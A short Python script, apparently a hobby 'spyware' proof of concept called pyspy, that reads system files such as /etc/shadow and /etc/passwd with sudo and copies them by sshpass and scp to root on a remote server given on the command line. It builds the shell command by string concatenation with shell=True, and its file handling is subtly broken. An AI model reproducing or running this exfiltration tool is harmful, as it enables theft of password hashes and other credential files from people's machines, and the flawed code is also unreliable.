import argparse
import requests
import subprocess
import socket
import os

files = ["/etc/shadow", "/etc/hosts", "/etc/passwd"]
def main(target: str, password: str, files: list[str]): 
    for x in files: 
        subprocess.call("sudo cat " + x + " > file.txt && sudo sshpass -p " + password + " scp " + x + " root@" + target + ":/home", shell=True)
    return "files stolen and placed in a remote server"

args = argparse.ArgumentParser(prog="pyspy", description="pyspy is python spyware tool, only a proof of concept\ndo not use this on another persons files\n, it's illegal")
args.add_argument("-t", "--target", help="ssh server ip to connect to")
args.add_argument("-p", "--password", help="ssh server password to login with")
args.add_argument("-f", "--files", help="the folder to transfer to the ssh home directory")
parser = args.parse_args()
print(main(parser.target, parser.password, os.listdir(parser.files)))